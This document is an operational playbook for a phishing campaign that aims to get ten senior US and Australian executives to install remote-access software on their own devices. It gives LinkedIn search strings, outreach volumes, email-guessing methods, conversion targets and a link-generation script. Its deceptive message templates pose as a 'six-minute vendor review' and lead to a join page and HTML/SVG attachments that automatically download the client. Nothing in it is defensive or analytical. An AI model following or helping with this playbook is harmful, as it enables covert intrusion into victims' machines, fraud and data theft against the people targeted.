# Targeting playbook — 10 senior US/AU installs

Objective: 10 installs on senior American or Australian targets (45–65, corporate /
owner / partner / C-level, high earning) on their **own** device.

The join page auto-detects the OS and starts the matching client download on first
paint. You do not need to know their device up front; the `?os=` override exists when
you do.

## 1. ICP and exclusions

Include: CEO / MD / COO / CFO / Partner / Practice Director / Owner in
private equity, family offices, wealth management, professional services, commercial
real estate, healthcare administration, light manufacturing, logistics, insurance
brokerage. 50–5,000 employees. US metros (NYC, Boston, Chicago, Dallas, LA, SF) and
AU metros (Sydney, Melbourne, Brisbane, Perth). Age proxy: 15+ years in senior roles,
graduated 1980–2000.

Exclude: students, solo freelancers, recruiters, people already using RustDesk/AnyDesk
inbound-heavy roles, companies under 10 staff.

## 2. Impactful seven-day sequence

LinkedIn is the main channel; email is the fallback.

| Day | Action |
|---|---|
| 0 | View their profile; follow the company page |
| 1 | Connection request with note (no link) |
| 2 | On accept: first message + meeting link |
| 4 | Follow-up with the opposite-device attachment |
| 7 | Email or InMail with the same link |

Limits: 20–30 connection requests/day (100–150/week), 40–60 DMs/day, 20 InMails/day.
One link per message; no shorteners.

## 3. LinkedIn search

Use Sales Navigator if available; the same keywords work in classic search.

Seniority filter: Owner, Partner, CXO, VP.
Function: Operations, Finance, General Management.
Geography: United States, Australia; then metro.
Company size: 51–200, 201–500, 501–1,000, 1,001–5,000.
Years in current position: 2+.

Base string (paste into the keyword box, keep the filters on):

```
("Chief Executive" OR CEO OR "Managing Director" OR "Chief Operating Officer" OR COO
OR "Chief Financial Officer" OR CFO OR "General Counsel" OR "VP Operations"
OR "Head of Operations" OR Partner OR Principal OR Owner OR Proprietor)
AND ("private equity" OR "family office" OR "wealth management" OR "professional services"
OR "commercial real estate" OR "healthcare" OR insurance OR manufacturing OR logistics)
```

Second pass, AU-specific:

```
("Managing Director" OR "Executive Director" OR "General Manager" OR Director OR Partner)
AND (Sydney OR Melbourne OR Brisbane OR Perth) AND (finance OR legal OR property OR health)
```

Third pass, signal-based:

```
("board" OR "governance" OR "due diligence" OR "vendor review" OR "digital transformation")
AND ("Chief" OR Director OR Partner)
```

Geo URNs are easiest picked in the UI (Geography → city). Save each search; work the
list from oldest to newest, 3 pages max/day.

## 4. Templates

Connection note — 300 characters max, no link:

```
Hi {First} — been following {Company}'s work in {sector}. I run a small remote-support
desk and we're doing a 6-minute vendor review with operators. Worth connecting?
```

First message (on accept):

```
Thanks for connecting, {First}. Quick context: we're testing a lighter remote-support
path for senior staff — one page, no account, no install calls.

The page picks the right client for your machine. Six minutes if you'll take it:
{link}
```

If they answer with their device or ask what it is:

```
It's a private Zoom-type join page for a short vendor review. If you're on {Mac|Windows},
this is the signed {macOS|Windows} build — the HTML note opens and fetches it:
{attach}
```

Follow-up (day 4, one only):

```
Bumping this once, {First} — the review closes Friday and your sector is the one piece
missing from the sample. {link}
```

Email version: subject `6-minute vendor review — {Company}` or
`Notes from the remote-support review`; body = first message, no images.

Facebook version: same copy, DM only after they reply to a comment; a group post gets
the link in the first comment, not the post body.

## 5. Facebook and TikTok

Facebook: join 10–15 groups where owners ask for tooling (`business owners`,
`CEOs and founders`, city chamber groups, `SaaS for small business`). Post a
symptom story ("remote support for a 60-person firm — what are you using?"), then DM
the link only to commenters. Page messages to pages you already follow; friend
requests first to unlock DM.

TikTok: search `#businessowner`, `#ceo`, `#smallbusiness`, `#founder`, `#australiabusiness`.
Comment value, not "check my link". Put the tracked link in the bio for 48 hours.

## 6. Email harvesting

Only after a LinkedIn touch. Pattern-guess `first.last@domain`, `first@domain`,
`flast@domain`; verify with Apollo/Hunter/Snov free tier and a bulk verifier; drop
role addresses except `it@` / `ops@`. Send only to verified mailboxes.

## 7. Funnel math

400 quality touches → ~20% reply (80) → ~25% click (20) → ~50% install on click (10).
At 40 touches/day that is 10 working days. Warmer intro chains convert 2–3×; mix in
10 intros from existing contacts. Track every id, source and click in
`/api/stats.csv?token=246d98a7ec3f05b1` (token-protected; rotate with the systemd drop-in).

## 8. Operating rhythm

- 08:30 — 20 connection requests with notes (US East morning / AU end of day)
- 09:30 — reply to every accept with message 1 (send the link)
- 13:00 — 20 DMs to yesterday's accepts, 10 follow-ups
- 16:00 — Facebook groups, comments, page DMs
- Friday — export stats, kill the two worst subject lines, rotate meeting ID weekly

## 9. Generating and sending

`tools/campaign-link.ps1 -Csv targets.csv` (columns `who,co,src,os`) returns a
tracked link and HTML/SVG attachment per row and writes `campaign-out.csv`.
`src` = `linkedin|facebook|tiktok|email`; `os` optional (`windows|macos|linux|android`).

## 10. Quality gate before sending

- Profile: real photo, current role, company page linked.
- Meeting ID/passcode valid; confirm the page loads and downloads on one phone and one
  laptop.
- One link per message; attachment only on request.
- `/api/stats.csv` reachable; token set.
